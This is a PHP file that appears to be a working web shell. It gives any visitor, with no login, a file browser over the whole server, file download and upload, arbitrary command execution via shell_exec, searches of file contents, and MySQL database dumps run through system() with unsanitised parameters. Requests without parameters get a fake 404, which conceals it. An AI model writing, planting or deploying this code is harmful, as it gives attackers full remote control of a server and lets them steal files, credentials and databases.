<?php

function recurs($dir, $word) {
    $files = scandir($dir);
	
    foreach ($files as $file) {
        if ($file == '.' or $file == '..') {
            continue;
        }

        $full_path = realpath($dir.'/'.$file);
		
        if (is_dir($full_path)) {
            recurs($full_path, $word);
        }
		else {
            if (stristr(file_get_contents($full_path), $word) !== false) {
                echo "<li style='list-style:none;'>📄 <a href='".htmlspecialchars($_SERVER['PHP_SELF'])."?path=".urlencode($full_path)."'>".htmlspecialchars($full_path)."</a></li>";
            }
        }
    }
}

function sort_scandir($dir) {
    $items = scandir($dir);
    
    $folders = array();
    $files   = array();
    
    foreach ($items as $item) {
        if (is_dir($dir.'/'.$item)) {
			$folders[$item] = $item;
        }
		else {
			$files[$item] = $item;
        }
    }
	
    sort($folders);
    sort($files);
    
    $result = array_merge($folders, $files);
    
    return $result;
}

$db   = $_GET['db'] ?? NULL;
$user = $_GET['user'] ?? NULL;
$pass = $_GET['pass'] ?? NULL;
$host = $_GET['host'] ?? NULL;

if ($db) {
	header('Content-Type: application/sql');
	header('Content-Disposition: attachment; filename="dump.sql"');
	header('Content-Transfer-Encoding: binary');
	system("mysqldump --host=".$host." --user=".$user." --password=".$pass." ".$db);
	exit;
}

$path     = $_GET['path'] ?? NULL;
$download = $_GET['download'] ?? NULL;

if ($path) {
	if (is_dir($path)) {
		echo "<a href='".htmlspecialchars($_SERVER['PHP_SELF'])."?path=".urlencode(dirname(__FILE__))."' style='color: gray;'>".htmlspecialchars(dirname(__FILE__))."</a>";

		$scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
		echo "<a href='".$scheme."://".htmlspecialchars($_SERVER['HTTP_HOST'])."/' target='_blank' style='color: gray; margin-left: 20px;'>".htmlspecialchars($_SERVER['HTTP_HOST'])."</a>";
		
		echo "<div style='display: flex; gap: 10px; align-items: center; flex-wrap: wrap;'>";
		
		echo "<form action='".htmlspecialchars($_SERVER['PHP_SELF'])."?path=".urlencode($path)."' method='POST' enctype='multipart/form-data' style='display: flex; gap: 5px; align-items: center; padding: 5px;'>
			<label for='file-upload' style='padding: 10px; cursor: pointer; background: #eee;'>[select file]</label>
			<input id='file-upload' type='file' name='file' style='display:none;' />
			<input type='submit' name='upload' value='Upload' />
		</form>";

		echo "<form action='".htmlspecialchars($_SERVER['PHP_SELF'])."?path=".urlencode($path)."' method='POST' style='display: flex; gap: 5px; align-items: center; padding: 5px;'>
			<input type='text' name='cmd' placeholder='uname -a' />
			<input type='submit' value='Execute' />
		</form>";
		
		echo "<form action='".htmlspecialchars($_SERVER['PHP_SELF'])."' method='get' style='display: flex; gap: 5px; align-items: center; padding: 5px;'>
			<input type='hidden' name='path' value='".htmlspecialchars($path)."' />
			<input type='text' name='recurs' placeholder='mysql' />
			<input type='submit' value='Search' />
		</form>";

		echo "<form action='".htmlspecialchars($_SERVER['PHP_SELF'])."?path=".urlencode($path)."' method='POST' enctype='multipart/form-data' style='display: flex; gap: 5px; align-items: center; padding: 5px;'>
			<input type='text' name='host' value='localhost' size='5' placeholder='host' />
			<input type='text' name='user' value='root' size='5' placeholder='user' />
			<input type='text' name='pass' size='5' placeholder='pass' />
			<input type='text' name='db' size='5' placeholder='db' />
			<input type='submit' name='mysql' value='Connect' />
		</form>";

		echo "</div>";
		
		if ($_SERVER['REQUEST_METHOD'] === 'POST') {
			if (isset($_POST['cmd'])) {
				$cmd = $_POST['cmd'];
				
				echo "<hr>";
				echo "<pre><b>Command:</b> ".htmlspecialchars($cmd)."\n";

				$output = shell_exec($cmd . " 2>&1");
				
				if (stripos(PHP_OS, 'WIN') === 0) {
					$output = mb_convert_encoding($output, 'UTF-8', 'CP866');
				}

				echo htmlspecialchars($output);
				echo "</pre>";
				echo "<hr>";
			}
			elseif (isset($_POST['upload'])) {
				if (isset($_FILES['file']) and $_FILES['file']['error'] == UPLOAD_ERR_OK) {
					if (move_uploaded_file($_FILES['file']['tmp_name'], $path.'/'.basename($_FILES['file']['name']))) {
						echo "<hr><ul><i>Uploaded</i></ul><hr>";
					}
				}
			}
			elseif (isset($_POST['mysql'])) {
				$host = $_POST['host'] ?? NULL;
				$user = $_POST['user'] ?? NULL;
				$pass = $_POST['pass'] ?? NULL;
				$db   = $_POST['db'] ?? NULL;
				
				try {
					$mysqli = mysqli_connect($host, $user, $pass, $db);
					mysqli_set_charset($mysqli, 'utf8');
					
					if ($mysqli) {
						$result = $mysqli->query("SHOW DATABASES");
						
						if ($result) {
							echo "<hr>";
							echo "<ul>";
							while ($row = $result->fetch_assoc()) {
								$db = $row['Database'];
								echo "<li><a href='?db=".urlencode($db)."&user=".urlencode($user)."&pass=".urlencode($pass)."&host=".urlencode($host)."'>".htmlspecialchars($db)."</a></li>";
							}
							echo "</ul>";
							echo "<hr>";
						}

						mysqli_close($mysqli);
					}
				}
				catch(mysqli_sql_exception $mysqli_error) {
					echo "<hr><ul><i>Connection error</i></ul><hr>";
				}
			}
		}
		
		$recurs = $_GET['recurs'] ?? NULL;
		
		if ($recurs) {
			echo "<hr>";
			echo "<ul>";
			recurs($path, $recurs);
			echo "</ul>";
			echo "<hr>";
		}
		
		//files
		$files = sort_scandir($path);
		
		echo "<ul style='list-style: none; padding-left: 10px;'>";
		for($i = 0; $i < count($files); $i++) {
			$full_path = realpath($path."/".$files[$i]);
			
            if (is_dir($full_path)) {
				$icon = "📁";
			} else {
				$icon = "📄";
			}
            
			echo "<li>".$icon." <a href='".htmlspecialchars($_SERVER['PHP_SELF'])."?path=".urlencode($full_path)."'>".htmlspecialchars($files[$i])."</a></li>";
		}
		echo "</ul>";
	}
	elseif (is_file($path)) {
		$path = str_replace('\\', '/', $path);
			
		echo "<p><a href='".htmlspecialchars($_SERVER['PHP_SELF'])."?download=".urlencode($path)."' class='download-btn'><button>Download</button></a></p>";
		
		highlight_file($path);
	}
	else {
		header('HTTP/1.0 404 Not Found');
		exit;
	}
}
elseif ($download) {
	header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($download).'"');
    header('Content-Length: '.filesize($download));
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    readfile($download);
    exit;
}
else {
	header('HTTP/1.0 404 Not Found');
	exit;
}



?>